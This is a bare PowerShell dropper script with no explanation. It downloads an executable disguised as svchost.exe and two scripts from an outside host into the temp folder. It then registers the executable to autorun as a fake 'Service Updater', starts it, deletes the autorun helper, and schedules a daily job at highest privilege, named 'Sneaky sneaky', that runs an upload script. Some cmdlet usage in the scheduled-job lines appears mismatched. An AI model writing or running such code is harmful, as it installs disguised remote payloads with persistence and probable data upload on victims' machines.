$url = 'http://generalkenobi.x10host.com/svchost.exe'
$url2 = 'http://generalkenobi.x10host.com/Autorun.ps1'
$url3 = 'http://generalkenobi.x10host.com/upload.ps1'
Invoke-WebRequest -Uri $url -OutFile "$env:temp\svchost.exe"
Invoke-WebRequest -Uri $url2 -OutFile "$env:temp\AutoRun.ps1"
Invoke-WebRequest -Uri $url3 -OutFile "$env:temp\upload.ps1"
& "$env:temp\AutoRun.ps1" -name "ServiceUpdate" -run "$env:temp\svchost.exe" -description "Service Updater"
Start-Process -Filepath "$env:temp\svchost.exe"
Remove-Item –path "$env:temp\AutoRun.ps1"
$Trigger= New-ScheduledTaskTrigger -At 10:00am –Daily
$Action= New-ScheduledTaskAction -Execute "upload.ps1" -Argument "http://generalkenobi.x10host.com/upload.ps1"
Register-ScheduledJob –Name ”Sneaky sneaky” -Trigger $Trigger -Action $Action -RunLevel Highest –Force
